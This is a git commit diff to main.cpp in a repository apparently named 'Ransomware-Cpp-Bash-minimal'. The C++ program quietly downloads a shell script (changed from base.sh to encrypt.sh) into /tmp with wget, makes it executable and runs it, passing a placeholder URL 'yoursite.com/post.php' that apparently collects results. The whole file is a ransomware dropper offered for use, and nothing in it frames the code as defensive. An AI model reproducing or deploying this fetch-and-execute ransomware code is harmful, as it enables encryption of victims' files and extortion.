1e165bd179a5606145be7d4efe9573c49bfeb21d
Drigg3r <drigg3r@yandex.com>
2016-10-29 19:41:58 -0500

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -5,7 +5,7 @@ using namespace std;
 
 int main()
 {
-	string cmd = "cd /tmp && wget -O /tmp/base.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/base.sh > /dev/null 2>&1 && chmod 777 /tmp/base.sh && ./base.sh http://yoursite.com/post.php";
+	string cmd = "cd /tmp && wget -O /tmp/encrypt.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/encrypt.sh > /dev/null 2>&1 && chmod 777 /tmp/encrypt.sh && ./encrypt.sh http://yoursite.com/post.php";
 	system(cmd.c_str());
 	return 0;
 }
